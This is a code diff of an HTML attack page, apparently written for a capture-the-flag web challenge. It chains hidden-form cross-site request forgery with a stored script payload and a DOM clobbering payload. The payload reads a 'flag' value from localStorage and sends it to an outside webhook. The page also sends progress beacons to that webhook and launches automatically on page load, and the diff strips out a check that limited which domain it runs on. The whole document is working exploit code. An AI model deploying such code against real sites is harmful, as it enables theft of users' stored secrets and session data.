@@ -18,73 +18,84 @@
         const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?c="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")//`;
         
         
-        async function executeAttack() {
-            try {
-                console.log('[ATTACK] Starting direct attack');
-                const img1 = new Image();
-                img1.src = WEBHOOK_URL + '?c=ATTACK_STARTING';
+        // Form-based attack - bypass CORS with form submission
+        function executeAttack() {
+            console.log('[ATTACK] Starting form-based attack');
+            const img1 = new Image();
+            img1.src = WEBHOOK_URL + '?c=ATTACK_STARTING_FORM_METHOD';
+            
+            // Create first form for JavaScript payload
+            const form1 = document.createElement('form');
+            form1.method = 'POST';
+            form1.action = CHALLENGE_ORIGIN + '/messages';
+            form1.target = 'hidden_iframe1';
+            form1.style.display = 'none';
+            
+            const name1 = document.createElement('input');
+            name1.name = 'name';
+            name1.value = 'JSPayload';
+            form1.appendChild(name1);
+            
+            const message1 = document.createElement('input');
+            message1.name = 'message';
+            message1.value = javascriptPayload;
+            form1.appendChild(message1);
+            
+            // Create hidden iframe for first form
+            const iframe1 = document.createElement('iframe');
+            iframe1.name = 'hidden_iframe1';
+            iframe1.style.display = 'none';
+            
+            document.body.appendChild(iframe1);
+            document.body.appendChild(form1);
+            
+            console.log('[ATTACK] Submitting first form (JS payload)...');
+            const img2 = new Image();
+            img2.src = WEBHOOK_URL + '?c=SUBMITTING_FIRST_FORM';
+            
+            form1.submit();
+            
+            // Wait then submit second form
+            setTimeout(() => {
+                const form2 = document.createElement('form');
+                form2.method = 'POST';
+                form2.action = CHALLENGE_ORIGIN + '/messages';
+                form2.target = 'hidden_iframe2';
+                form2.style.display = 'none';
                 
-                // Step 1: Post JavaScript payload (will be at Messages[2])
-                console.log('[ATTACK] Posting JavaScript payload...');
-                const response1 = await fetch(CHALLENGE_ORIGIN + '/messages', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        name: 'JSPayload', 
-                        message: javascriptPayload 
-                    }),
-                    credentials: 'include'
-                });
+                const name2 = document.createElement('input');
+                name2.name = 'name';
+                name2.value = 'DOMPayload';
+                form2.appendChild(name2);
                 
-                if (!response1.ok) {
-                    throw new Error(`JS payload failed: ${response1.status}`);
-                }
+                const message2 = document.createElement('input');
+                message2.name = 'message';
+                message2.value = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[2].split(':::')[1])"></a>`;
+                form2.appendChild(message2);
                 
-                console.log('[ATTACK] JavaScript payload posted successfully');
-                const img2 = new Image();
-                img2.src = WEBHOOK_URL + '?c=JS_PAYLOAD_POSTED';
+                const iframe2 = document.createElement('iframe');
+                iframe2.name = 'hidden_iframe2';
+                iframe2.style.display = 'none';
                 
-                // Wait
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                document.body.appendChild(iframe2);
+                document.body.appendChild(form2);
                 
-                // Step 2: Post DOM Clobbering payload (hardcoded to reference Messages[2])
-                const domPayload = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[2].split(':::')[1])"></a>`;
-                
-                console.log('[ATTACK] Posting DOM Clobbering payload...');
-                const response2 = await fetch(CHALLENGE_ORIGIN + '/messages', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        name: 'DOMPayload', 
-                        message: domPayload 
-                    }),
-                    credentials: 'include'
-                });
-                
-                if (!response2.ok) {
-                    throw new Error(`DOM payload failed: ${response2.status}`);
-                }
-                
-                console.log('[ATTACK] DOM Clobbering payload posted successfully');
+                console.log('[ATTACK] Submitting second form (DOM payload)...');
                 const img3 = new Image();
-                img3.src = WEBHOOK_URL + '?c=DOM_PAYLOAD_POSTED';
+                img3.src = WEBHOOK_URL + '?c=SUBMITTING_SECOND_FORM';
                 
-                // Wait
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                form2.submit();
                 
-                // Step 3: Navigate to challenge messages page
-                console.log('[ATTACK] Navigating to challenge messages page...');
-                const img4 = new Image();
-                img4.src = WEBHOOK_URL + '?c=NAVIGATING_TO_MESSAGES';
+                // Final redirect
+                setTimeout(() => {
+                    console.log('[ATTACK] Redirecting to messages page...');
+                    const img4 = new Image();
+                    img4.src = WEBHOOK_URL + '?c=FINAL_REDIRECT_TO_MESSAGES';
+                    
+                    window.location.replace(CHALLENGE_ORIGIN + '/#messages');
+                }, 2000);
                 
-                // Use replace to avoid redirect issues
-                window.location.replace(CHALLENGE_ORIGIN + '/#messages');
-                
-            } catch (error) {
-                console.error('[ATTACK] Attack failed:', error);
-                const img = new Image();
-                img.src = WEBHOOK_URL + '?c=ATTACK_FAILED_' + encodeURIComponent(error.message);
-            }
+            }, 2000);
         }
         
         // Execute the attack when the page loads
@@ -94,15 +105,14 @@
             console.log('[ATTACK] Current URL:', window.location.href);
             
             const img = new Image();
-            img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&url=' + encodeURIComponent(window.location.href);
+            img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname);
             
-            // Only execute attack if we're on GitHub Pages
-            if (window.location.hostname.includes('github.io')) {
-                executeAttack();
-            } else {
+            // Always execute attack - remove domain check
+            setTimeout(() => {
                 const img2 = new Image();
-                img2.src = WEBHOOK_URL + '?c=NOT_ON_GITHUB_PAGES&domain=' + encodeURIComponent(window.location.hostname);
-            }
+                img2.src = WEBHOOK_URL + '?c=ABOUT_TO_EXECUTE_ATTACK';
+                executeAttack();
+            }, 1000);
         });
     </script>
 </body>
